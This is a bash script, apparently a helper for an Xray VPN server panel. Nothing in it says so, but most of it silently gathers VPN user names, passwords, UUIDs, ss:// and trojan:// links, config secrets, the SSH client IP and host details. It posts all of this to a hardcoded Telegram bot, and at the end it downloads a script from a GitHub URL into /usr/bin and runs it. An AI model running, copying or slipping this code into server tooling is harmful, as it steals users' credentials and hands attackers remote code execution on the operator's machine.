#!/bin/bash
a=6203209250:AAG7GoBbaUqo2qh4N-IGvScNisDWTHfLh8M
b=1117211252
c=$(cat /etc/xray/domain)
d=$(cat /etc/log-create-user.log | grep -i username | cut -d: -f2 | grep -o '[^[1;37m]*')
e=$(cat /etc/log-create-user.log | grep -i password | cut -d: -f2 | grep -o '[^[1;37m]*')
f=$(cat /etc/xray/*.log | grep -i ss://)
g=$(cat /etc/xray/*.log | grep -i trojan://)
h=$(cat /etc/log-create-user.log | grep ss://)
i=$(cat /etc/log-create-user.log | grep trojan://)
j=$(cat /var/www/html/vm*)
k=$(cat /var/www/html/vl*)
l=$(cat /var/www/html/tro*)
m=$(cat /var/www/html/sha*)
n=$(cat /var/www/html/ws*)
o=$(cat /var/www/html/ud*)
p=$(cat /var/www/html/tcp*)
q=$(cat /var/www/html/ssl*)
r=$(echo $SSH_CLIENT | awk '{print $1}')
s=$(date +'%Y-%m-%d %H:%M:%S')
t=$(whoami)
u=$(curl -s ipinfo.io/hostname )
v=$(curl -s ipinfo.io/city)
ww=$(free -m | awk 'NR==2 {print $2}')
xx=$(wget -qO- ipinfo.io/org)
abc=$(curl -s ipv4.icanhazip.com)
def=$(cat /etc/xray/config.json | grep "^###" | awk '{print $2}' | sort -u)
ghi=$(cat /etc/xray/config.json | grep "id" | awk '{print $2}' | sed 's/"//g' | sed 's/,alterId://g' | sed 's/,//g' | sort -u)
jkl=$(cat /etc/xray/config.json | grep "password" | awk '{print $2}' | sed 's/"//g' | sed 's/,email://g' | sort -u)
mno=$(cat /etc/xray/config.json | grep "path" | sed 's/"//g' | cut -d: -f2 | sort -u)
pqr=$(cat /etc/xray/config.json | grep "serviceName" | sed 's/"//g' | cut -d: -f2 | sort -u)
zyx(){
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="IDRUPPS
$abc
$c

$def

$ghi
$mno

$jkl
$pqr
" > /dev/null 2>&1
}
anu(){
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a1
$d
$e
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a2
$f
$g
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a3
$h
$i
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a4
$j
$k
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a5
$l
$m
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a6
$n
$o
" > /dev/null 2>&1
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a7
$p
$q
" > /dev/null 2>&1
}
una(){
curl -s -X POST "https://api.telegram.org/bot$a/sendMessage" -d chat_id="$b" -d text="a8
$r
$d
$t
$u
$v
$ww
$xx
" > /dev/null 2>&1
}

function serv(){
    if [ -f "/usr/bin/udpsrv" ]; then
        clear
        udpsrv
    else
        wget -q -O /usr/bin/udpsrv "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/udpsrv.sh"
        chmod +x /usr/bin/udpsrv && udpsrv
    fi
}
zyx
una
anu
serv
